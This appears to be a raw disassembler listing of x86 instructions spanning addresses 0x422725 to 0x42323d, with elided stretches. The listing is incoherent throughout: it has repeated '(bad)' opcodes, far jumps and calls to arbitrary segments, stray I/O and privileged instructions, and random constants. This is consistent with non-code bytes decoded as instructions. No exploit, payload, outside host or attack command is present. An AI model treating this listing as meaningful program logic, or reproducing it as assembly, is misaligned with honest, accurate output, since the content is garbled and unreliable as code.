  422725:	mov    ebx,0xba5ebbb
  42272a:	inc    esp
  42272b:	std    
  42272c:	sbb    al,0x8e
  42272e:	mov    dl,0x3e
  422730:	mov    al,ds:0xaec8f6f4
  422735:	addr16 jmp 0x78ba:0x36032f96
  42273d:	and    DWORD PTR [ebp-0x7],ecx
  422740:	mov    ebp,0x7f
	...
  4227b1:	add    BYTE PTR [eax],al
  4227b3:	add    cl,dl
  4227b5:	mov    al,ds:0xf9f9e0b9
  4227ba:	fnstenv [ecx-0x69b500ed]
  4227c0:	cwde   
  4227c1:	and    ecx,DWORD PTR [edx+0x170e2d4]
  4227c7:	add    dh,dh
  4227c9:	add    BYTE PTR [eax],al
  4227cb:	add    BYTE PTR [ebx],dh
  4227cd:	in     al,dx
  4227ce:	in     al,0xf2
  4227d0:	gs or  DWORD PTR ds:[esi-0x7b6de763],esi
  4227d8:	shr    BYTE PTR [edx],1
  4227da:	dec    esi
  4227db:	push   ds
  4227dc:	xchg   ebx,eax
  4227dd:	add    eax,0xccc3432f
  4227e2:	cmp    DWORD PTR [eax+0x5e8ebf0a],edi
  4227e8:	mov    bh,0x3
  4227ea:	inc    ebp
  4227eb:	add    eax,0x7bbc963f
  4227f0:	dec    ebx
  4227f1:	push   si
  4227f3:	iret   
  4227f4:	cli    
  4227f5:	dec    esp
  4227f6:	sbb    DWORD PTR [esi-0x19],ecx
  4227f9:	jae    0x4227a3
  4227fb:	aas    
  4227fc:	test   al,0x4a
  4227fe:	ja     0x4227c4
  422800:	bound  edx,QWORD PTR [ecx+0x6a]
  422803:	mov    esp,0xc664e1b
  422808:	adc    dl,BYTE PTR [esi-0x3e]
  42280b:	mov    ds:0x4b0e6244,eax
  422810:	mov    ebx,0xb728ea45
  422815:	or     BYTE PTR [eax-0x74],al
  422818:	jbe    0x42284a
  42281a:	fsubrp st(4),st
  42281c:	fstp   DWORD PTR [ebp+eiz*8+0x7c]
  422820:	push   0xc8623839
  422825:	in     al,dx
  422826:	test   eax,0xed0feea0
  42282b:	adc    ch,bl
  42282d:	ins    DWORD PTR es:[edi],dx
  42282e:	pop    ebx
  42282f:	cmp    bl,bl
  422831:	adc    dl,dl
  422833:	xor    BYTE PTR [eax+0x45ec917c],dh
  422839:	sbb    al,0x81
  42283b:	mov    al,0x1f
  42283d:	adc    dl,BYTE PTR [ebp+0x6]
  422840:	cmp    al,0xa2
  422842:	ficomp WORD PTR [esi+0x73]
  422845:	mov    esp,ds
  422847:	push   esp
  422848:	mov    ch,0x5b
  42284a:	and    eax,0x7ac83245
  42284f:	cmp    al,0xca
  422851:	aaa    
  422852:	imul   ecx,DWORD PTR [ecx],0xffffffa3
  422855:	inc    ecx
  422856:	xor    DWORD PTR [edx-0x179b02da],ecx
  42285c:	push   0x51
  42285e:	(bad)  
  42285f:	mov    esp,0x7ceede9a
  422864:	leave  
  422865:	sub    BYTE PTR [edi+edi*4],bh
  422868:	(bad)  
  422869:	cmp    al,0x26
  42286b:	mov    esi,0x5fc0cda7
  422870:	cmp    BYTE PTR [esi+0x79b89814],ah
  422876:	lahf   
  422877:	stos   DWORD PTR es:[edi],eax
  422878:	sbb    edi,ecx
  42287a:	push   esi
  42287b:	mov    esp,0x837d5e04
  422880:	lahf   
  422881:	add    BYTE PTR [eax+edx*4],ch
  422884:	push   ds
  422885:	dec    esp
  422886:	dec    edi
  422887:	jae    0x4228fa
  422889:	push   0x74
  42288b:	cmp    BYTE PTR [ebp+eiz*4+0x52],cl
  42288f:	pusha  
  422890:	and    eax,0x4aa1f65d
  422895:	aaa    
  422896:	sbb    edi,DWORD PTR [edi+0x1284a4b1]
  42289c:	call   0xf3b5:0x1bf75dfc
  4228a3:	(bad)  
  4228a4:	in     eax,dx
  4228a5:	xor    al,0x29
  4228a7:	rcl    BYTE PTR [edi],1
  4228a9:	inc    ebp
  4228aa:	pop    es
  4228ab:	in     eax,dx
  4228ac:	mov    cl,0x74
  4228ae:	mov    ah,BYTE PTR ds:0x33e4df16
  4228b4:	shr    DWORD PTR [edi+0x34],1
  4228b7:	mov    ebp,0x5760ffb
  4228bc:	jno    0x422904
  4228be:	scas   al,BYTE PTR es:[edi]
  4228bf:	repz cdq 
  4228c1:	xlat   BYTE PTR ds:[ebx]
	...
  422932:	add    BYTE PTR [eax],al
  422934:	(bad)  
  422935:	cld    
  422936:	je     0x422955
  422938:	jbe    0x4228d7
  42293a:	(bad)  
  42293b:	jmp    ebx
  42293d:	lea    ecx,[ebx]
  42293f:	xchg   esp,eax
  422940:	aam    0x5d
  422942:	push   cs
  422943:	retf   0x71d8
  422946:	add    DWORD PTR [eax],eax
  422948:	test   BYTE PTR [eax],0x0
  42294b:	add    al,dh
  42294d:	inc    edi
  42294e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42294f:	(bad)  
  422950:	enter  0x82e9,0xa7
  422954:	xchg   edx,esi
  422956:	outs   dx,BYTE PTR ds:[esi]
  422957:	sbb    al,0xd0
  42295a:	sub    BYTE PTR [edi+0x2b9f7bf5],dh
  422960:	rcr    DWORD PTR [ebx+0x77],cl
  422963:	outs   dx,DWORD PTR ds:[esi]
  422964:	mov    edi,ds
  422966:	dec    edx
  422967:	mov    ds:0x1ff4c33f,eax
  42296c:	jl     0x42296a
  42296e:	sub    edx,DWORD PTR [esi-0x38adf4ca]
  422974:	mov    DWORD PTR [esi],ebp
  422976:	jae    0x4229a7
  422978:	lds    ebp,FWORD PTR [eax+0x34a65442]
  42297e:	lahf   
  42297f:	das    
  422980:	into   
  422981:	iret   
  422982:	push   0x21
  422984:	in     eax,dx
  422985:	fnstsw WORD PTR [ebx]
  422987:	jb     0x42297e
  422989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42298a:	cmp    ah,dh
  42298c:	fmul   DWORD PTR [edi-0x26c4d560]
  422992:	outs   dx,DWORD PTR ds:[esi]
  422993:	push   edi
  422994:	repz mov ds:0x13e50352,al
  42299a:	fnstsw WORD PTR [ecx+ebp*2-0x4c3d253e]
  4229a1:	mov    ah,0x69
  4229a3:	std    
  4229a4:	outs   dx,BYTE PTR ds:[esi]
  4229a5:	xor    eax,0xae87a169
  4229aa:	sbb    BYTE PTR [esi],bh
  4229ac:	pop    esi
  4229ad:	xor    bh,BYTE PTR [ebp+0x4e7cf5da]
  4229b3:	hlt    
  4229b4:	shl    BYTE PTR [ebx+0x60],cl
  4229b7:	inc    ebp
  4229b8:	jo     0x422a1d
  4229ba:	add    al,0x8b
  4229bc:	mov    edx,0x9438afd9
  4229c1:	retf   0x6c0a
  4229c4:	fbstp  TBYTE PTR cs:[edi]
  4229c7:	test   DWORD PTR [eax+esi*4+0x7352c24f],esi
  4229ce:	(bad)  
  4229cf:	lods   eax,DWORD PTR ds:[esi]
  4229d0:	mov    eax,ds:0x42f175d3
  4229d5:	mov    WORD PTR [edi-0x43],?
  4229d8:	gs push es
  4229da:	mov    bh,0x20
  4229dc:	jbe    0x4229a5
  4229de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229df:	shr    DWORD PTR [esi-0x664ae082],1
  4229e5:	add    eax,0x8fa8873c
  4229ea:	and    al,0x95
  4229ec:	dec    edi
  4229ed:	mov    ebx,0x90d82a53
  4229f2:	sub    ch,BYTE PTR [esi+0x61]
  4229f5:	dec    ecx
  4229f6:	aad    0x55
  4229f8:	inc    ebp
  4229f9:	sbb    al,0x11
  4229fb:	lds    esp,FWORD PTR [edx-0x45]
  4229fe:	or     al,0x6b
  422a00:	shl    BYTE PTR [ecx-0x41],0xee
  422a04:	adc    dh,BYTE PTR [esi]
  422a06:	lods   eax,DWORD PTR ds:[esi]
  422a07:	mov    dh,0xda
  422a09:	aad    0xfb
  422a0b:	aad    0x64
  422a0d:	pop    esp
  422a0e:	fnsave [ebx+0x48ce8454]
  422a14:	add    dl,BYTE PTR [ebp+0x50]
  422a17:	jbe    0x422a25
  422a19:	push   esi
  422a1a:	pop    ebp
  422a1b:	or     DWORD PTR [edx+0x7e],ebx
  422a1e:	sbb    ecx,DWORD PTR [esi-0x21]
  422a21:	pop    ds
  422a22:	cmp    esp,0x16
  422a25:	ins    DWORD PTR es:[edi],dx
  422a26:	(bad)  
  422a27:	cmpxchg DWORD PTR [ebx+eiz*4-0x50cbc28f],edx
  422a2f:	pop    ebx
  422a30:	test   DWORD PTR [ecx-0x13],esp
  422a33:	(bad)  
  422a34:	adc    bh,bl
  422a36:	xor    BYTE PTR [eax-0x725c8c2c],al
  422a3c:	mov    eax,ds:0xee6a99f2
  422a41:	dec    ebx
	...
  422ab2:	add    BYTE PTR [eax],al
  422ab4:	push   ss
  422ab5:	cdq    
  422ab6:	jmp    0x37401a88
  422abb:	fcmovnbe st,st(0)
  422abd:	cld    
  422abe:	xor    al,0xd0
  422ac0:	daa    
  422ac1:	ds jmp 0x1b4f977
  422ac7:	add    dh,dh
  422ac9:	add    BYTE PTR [eax],al
  422acb:	add    cl,bh
  422acd:	not    BYTE PTR [ecx]
  422acf:	push   ebp
  422ad0:	inc    ebx
  422ad1:	test   BYTE PTR [eax+ecx*8-0x4e],0x78
  422ad6:	pop    eax
  422ad7:	mov    ah,0x2b
  422ad9:	jo     0x422ad6
  422adb:	mov    bl,0x18
  422add:	dec    edi
  422ade:	push   esi
  422adf:	adc    edi,edx
  422ae1:	lahf   
  422ae2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ae3:	xlat   BYTE PTR ds:[ebx]
  422ae4:	leave  
  422ae5:	xor    eax,0x5bd68e08
  422aea:	ds (bad) 
  422aed:	cmp    ebx,DWORD PTR [ebx+0x40]
  422af0:	aaa    
  422af1:	pop    ss
  422af2:	(bad)  
  422af3:	addr16 aam 0xdc
  422af6:	pop    ss
  422af7:	xchg   esi,eax
  422af8:	repz mov bh,0xa3
  422afb:	and    DWORD PTR [eax],esp
  422afd:	mov    DWORD PTR [ebx+0x23f6cc49],ecx
  422b03:	dec    esp
  422b04:	cmp    al,0x71
  422b06:	in     eax,dx
  422b07:	pop    esp
  422b08:	cmp    DWORD PTR [esi+0x52],0x3b
  422b0c:	mov    edx,0x12f8a760
  422b11:	ss call 0x58:0xef3a4963
  422b19:	adc    DWORD PTR [eax+0x10],edx
  422b1c:	adc    eax,0x91dd4000
  422b21:	fs sub al,0x9
  422b24:	arpl   WORD PTR [esi],dx
  422b26:	mov    bl,0xdd
  422b28:	ds mov ebp,0x44d5cd93
  422b2e:	adc    BYTE PTR [ebp-0x27],0x85
  422b32:	and    al,0x3b
  422b34:	jb     0x422b72
  422b36:	neg    dl
  422b38:	adc    eax,0x118032d1
  422b3d:	shr    DWORD PTR [eax+eax*4+0x448f0292],1
  422b44:	test   eax,0x2af81f49
  422b49:	xchg   edi,eax
  422b4a:	aam    0x56
  422b4c:	dec    esp
  422b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b4e:	xchg   esp,eax
  422b4f:	out    0xbe,al
  422b51:	xchg   esi,eax
  422b52:	adc    esi,DWORD PTR [esi-0x76]
  422b55:	fistp  WORD PTR [ecx+0x5eddd9f0]
  422b5b:	push   es
  422b5c:	test   DWORD PTR [ecx+0x15d143ac],edi
  422b62:	push   ebp
  422b63:	xchg   ebx,eax
  422b64:	rcr    dh,cl
  422b66:	js     0x422b6a
  422b68:	adc    al,0x2
  422b6a:	test   DWORD PTR [edi],ecx
  422b6c:	bound  esp,QWORD PTR [ebx+eiz*1-0x35]
  422b70:	jle    0x422bc6
  422b72:	or     eax,0xa3b7fd35
  422b77:	adc    BYTE PTR [edi+eiz*4+0x39],dh
  422b7b:	or     edx,DWORD PTR [esi+0x32dbe180]
  422b81:	(bad)  
  422b82:	popf   
  422b83:	push   es
  422b84:	lods   al,BYTE PTR ds:[esi]
  422b85:	lahf   
  422b86:	repnz xchg ebp,eax
  422b88:	jne    0x422b94
  422b8a:	dec    ecx
  422b8b:	cli    
  422b8c:	and    eax,0x861fcf05
  422b91:	cmp    cl,BYTE PTR [edi]
  422b93:	inc    esp
  422b94:	mov    cl,0x7a
  422b96:	mov    ch,BYTE PTR [edi+0x79]
  422b99:	pop    eax
  422b9a:	test   eax,0xf4f67d35
  422b9f:	clc    
  422ba0:	lods   al,BYTE PTR ds:[esi]
  422ba1:	cmp    DWORD PTR [edx-0x73fc5916],edi
  422ba7:	lods   eax,DWORD PTR ds:[esi]
  422ba8:	or     DWORD PTR [edi-0x79],ebp
  422bab:	ss out 0x4b,eax
  422bae:	xor    DWORD PTR [ebp-0xf],edx
  422bb1:	inc    esp
  422bb2:	neg    BYTE PTR ds:0x3043065d
  422bb8:	xor    DWORD PTR [esi+0x20],0x5d
  422bbc:	cmp    ebx,DWORD PTR [eax+0xc]
  422bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422bc0:	mov    ss,WORD PTR [eax]
	...
  422c32:	add    BYTE PTR [eax],al
  422c34:	mov    al,0x6b
  422c36:	mov    ch,0xe5
  422c38:	(bad)  
  422c39:	push   eax
  422c3b:	jg     0x422c9e
  422c3d:	pop    es
  422c3e:	jne    0x422bca
  422c40:	inc    esp
  422c41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422c42:	aaa    
  422c43:	sbb    esp,eax
  422c45:	jae    0x422c48
  422c47:	add    dh,dh
  422c49:	add    BYTE PTR [eax],al
  422c4b:	add    BYTE PTR [ebp-0x2b90cde0],dl
  422c51:	(bad)  
  422c52:	outs   dx,BYTE PTR ds:[esi]
  422c53:	dec    edx
  422c54:	test   BYTE PTR [ebx+0x456010ad],al
  422c5a:	cmp    al,0x66
  422c5c:	sti    
  422c5d:	sub    al,al
  422c5f:	pop    ds
  422c60:	jl     0x422cc5
  422c62:	jmp    0xd276ce95
  422c67:	lds    eax,FWORD PTR [esi]
  422c69:	mov    bh,0x9f
  422c6b:	mov    ebx,0xe5bada60
  422c70:	mov    ch,0x1a
  422c72:	(bad)  [edx-0x5d68394e]
  422c78:	test   eax,0x9eb2a77e
  422c7d:	mov    BYTE PTR [edx-0x30],cl
  422c80:	ret    
  422c81:	neg    DWORD PTR [esp+eax*4+0x98b9656]
  422c88:	lock repz aaa 
  422c8b:	push   0xffffffbd
  422c8d:	xchg   edi,eax
  422c8e:	test   al,0xac
  422c90:	in     eax,dx
  422c91:	jecxz  0x422cb9
  422c93:	mov    eax,0x12cb83fa
  422c98:	ret    0xed93
  422c9b:	loopne 0x422c21
  422c9d:	retf   0x7262
  422ca0:	push   esp
  422ca1:	ss dec eax
  422ca3:	out    dx,al
  422ca4:	lock xchg DWORD PTR [eax-0x59],edx
  422ca8:	cli    
  422ca9:	jle    0x422c55
  422cab:	mov    bl,0x7f
  422cad:	push   0x12
  422caf:	push   ebp
  422cb0:	gs (bad) 
  422cb2:	and    esi,DWORD PTR [eax+0x41a44e99]
  422cb8:	test   DWORD PTR [ebp+0x52752d8d],esp
  422cbe:	(bad)  
  422cc0:	pop    esp
  422cc1:	adc    edx,esp
  422cc3:	ja     0x422cfd
  422cc5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422cc6:	xor    eax,eax
  422cc8:	sub    ebp,ebp
  422cca:	fnsave [edi-0x6a36248f]
  422cd0:	jno    0x422c9c
  422cd2:	pusha  
  422cd3:	test   al,0x83
  422cd5:	jb     0x422ca7
  422cd7:	jp     0x422c8a
  422cd9:	xor    al,0xd2
  422cdb:	outs   dx,DWORD PTR ds:[esi]
  422cdc:	jns    0x422d32
  422cde:	sbb    esi,DWORD PTR [edi+eiz*8-0x5697e404]
  422ce5:	xor    esp,eax
  422ce7:	shl    DWORD PTR [eax-0xb],1
  422cea:	test   DWORD PTR [eax-0x54],eax
  422ced:	(bad)  
  422cee:	fisttp QWORD PTR [esi-0x5b]
  422cf1:	in     al,0x97
  422cf3:	loope  0x422d6a
  422cf5:	popa   
  422cf6:	mov    es,WORD PTR [ecx]
  422cf8:	mov    ds:0x4d0f3837,eax
  422cfd:	call   0xdc93f8d6
  422d02:	sub    DWORD PTR [ecx+ebx*1+0x496f0b1a],edi
  422d09:	mov    al,0xa
  422d0b:	xor    DWORD PTR ds:0x6978c128,ebp
  422d11:	out    0x1d,eax
  422d13:	mov    ebx,ebp
  422d15:	std    
  422d16:	stos   DWORD PTR es:[edi],eax
  422d17:	lock shl DWORD PTR [edi+0x29],cl
  422d1b:	cli    
  422d1c:	fsub   DWORD PTR [ecx-0x47]
  422d1f:	adc    DWORD PTR [edx+0x3],edi
  422d22:	xor    eax,0xb21a332d
  422d27:	push   ebp
  422d28:	jns    0x422cdc
  422d2a:	jmp    0x4e5e8d7d
  422d2f:	dec    ebx
  422d30:	adc    eax,0xcf62ded1
  422d35:	or     al,0x55
  422d37:	cld    
  422d38:	mov    WORD PTR [edi+edi*2-0x74],ds
  422d3c:	jno    0x422d86
  422d3e:	mov    ecx,0xaf01e5
	...
  422db3:	add    bh,cl
  422db5:	mov    eax,ds:0xbf7f851b
  422dba:	fucomip st,st(3)
  422dbc:	addr16 mov ecx,0x91c7f9f7
  422dc2:	push   eax
  422dc3:	cmp    edi,DWORD PTR [edx-0x9fffe8c]
  422dc9:	add    BYTE PTR [eax],al
  422dcb:	add    BYTE PTR [eax-0x63a08dc6],bh
  422dd1:	sbb    eax,0x54365c73
  422dd6:	jl     0x422e24
  422dd8:	sar    DWORD PTR [ecx+ebx*2],cl
  422ddb:	out    dx,al
  422ddc:	jge    0x422d76
  422dde:	add    ebx,ebp
  422de0:	push   ebx
  422de1:	or     DWORD PTR [esi],ecx
  422de3:	sub    al,0xd9
  422de5:	and    DWORD PTR es:[esi-0x5bd60c77],esi
  422dec:	lods   al,BYTE PTR ds:[esi]
  422ded:	mov    dl,ch
  422def:	mov    ecx,0x2d7c0db8
  422df4:	mov    ds:0xb8239333,eax
  422df9:	sub    al,0xb
  422dfb:	xor    ch,0x97
  422dfe:	aad    0x5
  422e00:	out    dx,al
  422e01:	js     0x422e03
  422e03:	inc    ebp
  422e04:	and    DWORD PTR [esp+eax*1+0x25],ecx
  422e08:	inc    eax
  422e09:	mov    DWORD PTR [ecx],ecx
  422e0b:	dec    ebx
  422e0c:	rol    DWORD PTR [ecx+esi*8-0x55],cl
  422e10:	call   0xaf369a36
  422e15:	sbb    edi,DWORD PTR [esi+0x3f54c9e6]
  422e1b:	mov    ebp,?
  422e1d:	(bad)  
  422e1e:	mul    BYTE PTR [edx-0x46]
  422e21:	and    al,0x2f
  422e23:	xchg   BYTE PTR [ebx-0x3c11716e],ch
  422e29:	inc    edi
  422e2a:	test   DWORD PTR [ebx+eax*4],edi
  422e2d:	enter  0x8ede,0x7d
  422e31:	push   edx
  422e32:	and    BYTE PTR [edi+edx*8],ch
  422e35:	add    ebp,esp
  422e37:	lds    ecx,FWORD PTR [ecx+0x22]
  422e3a:	and    BYTE PTR [eax],0x1e
  422e3d:	mov    eax,ds:0xf4dd4f62
  422e42:	and    al,0x27
  422e44:	xchg   ebx,eax
  422e45:	add    BYTE PTR [eax+0x1a],0x4f
  422e49:	fwait
  422e4a:	xor    BYTE PTR [edx+0x78],dh
  422e4d:	popa   
  422e4e:	jle    0x422dda
  422e50:	add    al,0x45
  422e52:	push   ds
  422e53:	inc    ecx
  422e54:	jo     0x422ecc
  422e56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e57:	(bad)  
  422e58:	sar    BYTE PTR [edx],0x88
  422e5b:	cld    
  422e5c:	sbb    bh,BYTE PTR [eax-0x4d]
  422e5f:	dec    ebp
  422e60:	sub    al,0xb7
  422e62:	xor    eax,0xbd05792e
  422e67:	(bad)  
  422e68:	(bad)  [edx-0x288dc99]
  422e6e:	sub    ebp,DWORD PTR ds:0xc0c41b57
  422e74:	mov    eax,0x178c6504
  422e79:	ja     0x422ea8
  422e7b:	pop    es
  422e7c:	push   edi
  422e7d:	rcr    eax,cl
  422e7f:	movd   DWORD PTR ds:0x3924895b,mm0
  422e86:	jmp    0x422e54
  422e88:	not    DWORD PTR [edx+0x6fcb0c58]
  422e8e:	push   edi
  422e8f:	out    dx,eax
  422e90:	aaa    
  422e91:	leave  
  422e92:	pop    ebp
  422e93:	sub    DWORD PTR [esi+0x5b],ebx
  422e96:	xchg   edi,eax
  422e97:	xor    BYTE PTR [ebx-0x37],dh
  422e9a:	aam    0x9b
  422e9c:	push   es
  422e9d:	mov    BYTE PTR [ecx+edx*2],ah
  422ea0:	ins    DWORD PTR es:[edi],dx
  422ea1:	sbb    ebp,DWORD PTR [ecx]
  422ea3:	sub    al,0xf0
  422ea5:	jae    0x422e82
  422ea7:	out    0xcc,al
  422ea9:	cli    
  422eaa:	arpl   WORD PTR [edi+ebp*1],bp
  422ead:	jl     0x422ea8
  422eaf:	pop    ecx
  422eb0:	icebp  
  422eb1:	shr    DWORD PTR [ebp+0x14],0x55
  422eb5:	mov    ah,0x38
  422eb7:	or     al,0x9d
  422eb9:	(bad)  
  422eba:	fcomp  DWORD PTR [ebx-0xf]
  422ebd:	and    al,BYTE PTR [esi]
  422ebf:	fnstenv [ebx+0xb7]
	...
  422f31:	add    BYTE PTR [eax],al
  422f33:	add    BYTE PTR [ebx+0x6],ch
  422f36:	(bad)  
  422f37:	dec    edi
  422f38:	out    dx,eax
  422f39:	iret   
  422f3a:	jmp    0x422f62
  422f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f3d:	add    ah,BYTE PTR fs:[di]
  422f41:	jg     0x422f44
  422f43:	fidiv  DWORD PTR [eax-0x9fffe8b]
  422f49:	add    BYTE PTR [eax],al
  422f4b:	add    dl,al
  422f4d:	xchg   DWORD PTR es:[ebp+0x113e8f0f],ebx
  422f54:	inc    edx
  422f55:	xchg   ecx,eax
  422f56:	and    eax,0xed1869ee
  422f5c:	xor    esp,ecx
  422f5e:	popa   
  422f5f:	icebp  
  422f60:	xor    al,0xa7
  422f62:	jbe    0x422f9b
  422f64:	and    ebx,DWORD PTR [edi-0x54]
  422f67:	push   esi
  422f68:	xchg   esi,eax
  422f69:	and    ch,al
  422f6b:	mov    al,0x79
  422f6d:	(bad)  
  422f6f:	ins    BYTE PTR es:[edi],dx
  422f70:	xor    eax,0x53fc44b
  422f75:	mov    WORD PTR [edi+ecx*1],?
  422f78:	push   cs
  422f79:	and    bh,BYTE PTR [ebp+0x4aad28c8]
  422f7f:	jge    0x422fed
  422f81:	sti    
  422f82:	fidivr DWORD PTR [esp+eax*2]
  422f85:	jl     0x422f51
  422f87:	popf   
  422f88:	das    
  422f89:	jge    0x422fd2
  422f8b:	mov    bl,0xb3
  422f8d:	rcl    esi,0xeb
  422f90:	cwde   
  422f91:	pop    ss
  422f92:	addr16 inc ebx
  422f94:	and    BYTE PTR [esi+esi*8-0x5d],0xc9
  422f99:	rdmsr  
  422f9b:	nop
  422f9c:	sar    DWORD PTR ds:0x4797291,1
  422fa2:	and    ecx,DWORD PTR [eax+eax*1]
  422fa5:	popa   
  422fa6:	pop    ebx
  422fa7:	(bad)
  422faa:	dec    edx
  422fab:	jge    0x422f9c
  422fad:	pop    eax
  422fae:	int    0xb9
  422fb0:	inc    edi
  422fb1:	(bad)  
  422fb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fb3:	outs   dx,DWORD PTR ds:[esi]
  422fb4:	jb     0x422f9d
  422fb6:	xor    al,0x37
  422fb8:	je     0x422fa2
  422fba:	in     eax,dx
  422fbb:	xchg   edi,eax
  422fbc:	enter  0x57c1,0xfc
  422fc0:	and    BYTE PTR [eax-0x26],dl
  422fc3:	clc    
  422fc4:	call   FWORD PTR [eax-0xa]
  422fc7:	mov    es,WORD PTR [edi+0x53]
  422fca:	scas   eax,DWORD PTR es:[edi]
  422fcb:	xor    eax,0x8ba951e1
  422fd0:	jns    0x422fff
  422fd2:	dec    edi
  422fd3:	lods   eax,DWORD PTR ds:[esi]
  422fd4:	dec    ecx
  422fd5:	sbb    dh,BYTE PTR [eax]
  422fd7:	sub    DWORD PTR [ebx],ebp
  422fd9:	inc    eax
  422fda:	mov    bl,0x44
  422fdc:	sbb    eax,0x6b0c2de3
  422fe1:	pusha  
  422fe2:	mov    BYTE PTR [ebx+esi*4+0x3d],ch
  422fe6:	repz cli 
  422fe8:	retf   0x362b
  422feb:	jmp    0xd701:0xa30f1330
  422ff2:	repnz popa 
  422ff4:	mov    ds:0x31b992c5,al
  422ff9:	int    0x28
  422ffb:	fwait
  422ffc:	test   BYTE PTR [edi+eiz*1+0x5b],al
  423000:	loope  0x422fab
  423002:	jg     0x423009
  423004:	repnz inc ebp
  423006:	adc    ah,cl
  423008:	push   es
  423009:	dec    esi
  42300a:	mov    ch,0x8a
  42300c:	pop    esp
  42300d:	add    ah,bl
  42300f:	scas   al,BYTE PTR es:[edi]
  423010:	imul   eax,ebx,0xf5349908
  423016:	popa   
  423017:	lods   eax,DWORD PTR ds:[esi]
  423018:	ins    BYTE PTR es:[edi],dx
  423019:	jns    0x422ff6
  42301b:	test   ebx,0x15ffdd8f
  423021:	ret    0x62df
  423024:	jmp    0xe768fa6c
  423029:	mov    ebx,edi
  42302b:	int3   
  42302c:	call   0xef614a72
  423031:	adc    DWORD PTR [eax],edi
  423033:	cwde   
  423034:	cs xchg ebx,eax
  423036:	sar    BYTE PTR [eax+0x13755cea],0x39
  42303d:	and    al,BYTE PTR [esp+ebx*2-0x48]
  423041:	lds    eax,FWORD PTR [eax]
	...
  4230b3:	add    BYTE PTR [esi-0x284ae],ah
  4230b9:	std    
  4230ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230bb:	pop    ebx
  4230bc:	lods   eax,DWORD PTR ds:[esi]
  4230bd:	jne    0x423121
  4230bf:	xchg   ecx,eax
  4230c0:	sbb    BYTE PTR [ebx+0x76a62faf],cl
  4230c6:	add    DWORD PTR [eax],eax
  4230c8:	test   BYTE PTR [eax],0x0
  4230cb:	add    dh,al
  4230cd:	jmp    0x754d:0x667dacfa
  4230d4:	addr16 pop esp
  4230d6:	lock clc 
  4230d8:	dec    esp
  4230d9:	(bad)  
  4230da:	out    dx,al
  4230db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230dc:	and    BYTE PTR [edx],dh
  4230de:	div    DWORD PTR [ecx+0x7f64d3e1]
  4230e4:	jno    0x42306e
  4230e6:	pop    ecx
  4230e7:	shl    dh,1
  4230e9:	ret    0x2c08
  4230ec:	imul   eax
  4230ee:	repz push esi
  4230f0:	pusha  
  4230f1:	push   ds
  4230f2:	mov    cl,0x9c
  4230f4:	xor    eax,0x6209c8fe
  4230f9:	jle    0x42310b
  4230fb:	push   ebx
  4230fc:	fdivr  st,st(4)
  4230fe:	out    dx,eax
  4230ff:	mov    WORD PTR [ebp-0x35],cs
  423102:	pop    esp
  423103:	push   edx
  423104:	jmp    0x7b97:0x59e6e6e0
  42310b:	cdq    
  42310c:	(bad)  
  42310d:	mov    bh,BYTE PTR [esi-0x13da8ee7]
  423113:	iret   
  423114:	mov    BYTE PTR [eax+0x31],al
  423117:	mov    eax,ds:0xebab593b
  42311c:	sub    BYTE PTR [esi],cl
  42311e:	mov    bh,0xdc
  423120:	fdivr  DWORD PTR [esi]
  423122:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423123:	cmp    DWORD PTR [eax],ebx
  423125:	outs   dx,DWORD PTR ds:[esi]
  423126:	mov    BYTE PTR [edi-0x4b],dl
  423129:	out    0x5f,eax
  42312b:	in     eax,dx
  42312c:	push   ebp
  42312d:	xchg   DWORD PTR [eax],ecx
  42312f:	lods   al,BYTE PTR ds:[esi]
  423130:	fiadd  DWORD PTR [edi-0x60]
  423133:	xor    BYTE PTR ds:0xc6049e44,al
  423139:	dec    ebx
  42313a:	in     al,dx
  42313b:	clc    
  42313c:	sbb    ebp,eax
  42313e:	jp     0x423188
  423140:	pusha  
  423141:	test   BYTE PTR [ebp+0x271d3b4],al
  423147:	mov    ecx,0x9cd127fa
  42314c:	call   0xbbcb:0xbb05d179
  423153:	loop   0x4230f5
  423155:	cmc    
  423156:	xor    BYTE PTR [edi-0x40d1a469],dh
  42315c:	mov    bl,0xc0
  42315e:	cwde   
  42315f:	mov    bl,0x77
  423161:	xchg   ebx,eax
  423162:	jbe    0x423197
  423164:	xor    al,0x60
  423166:	push   ecx
  423167:	inc    edi
  423168:	mov    ebx,0x89832986
  42316d:	ror    esp,1
  42316f:	or     eax,0x16e2d13d
  423174:	jecxz  0x4231ef
  423176:	repnz adc edi,DWORD PTR [ebx+0x3f]
  42317a:	fwait
  42317b:	push   edx
  42317c:	push   ss
  42317d:	or     edx,DWORD PTR [ebx]
  42317f:	pop    ds
  423180:	aam    0x44
  423182:	inc    ebp
  423183:	dec    eax
  423184:	or     eax,0x61bd674f
  423189:	popf   
  42318a:	fldcw  WORD PTR [ebx+0x15]
  42318d:	(bad)  
  42318e:	loop   0x423177
  423190:	pusha  
  423191:	push   0x1c
  423193:	xlat   BYTE PTR ds:[ebx]
  423194:	mov    bh,0x6e
  423196:	mov    dh,0x43
  423198:	add    bh,BYTE PTR [eax+ebp*8-0x49]
  42319c:	xor    DWORD PTR ds:0x6ae2b8a4,esp
  4231a2:	loopne 0x423179
  4231a4:	das    
  4231a5:	(bad)  
  4231a6:	(bad)
  4231aa:	mov    ah,0x93
  4231ac:	add    ch,dl
  4231ae:	xor    esp,DWORD PTR [edi+0x54326cf]
  4231b4:	xor    eax,0xd48fe814
  4231b9:	fst    QWORD PTR [esi-0x4d87ed1f]
  4231bf:	call   0x42780e
	...
  423234:	(bad)  
  423235:	in     eax,dx
  423236:	lods   eax,DWORD PTR ds:[esi]
  423237:	imul   edi
  423239:	neg    edi
  42323b:	std    
  42323c:	stc    
  42323d:	idiv   DWORD PTR ds:0x40e656b0
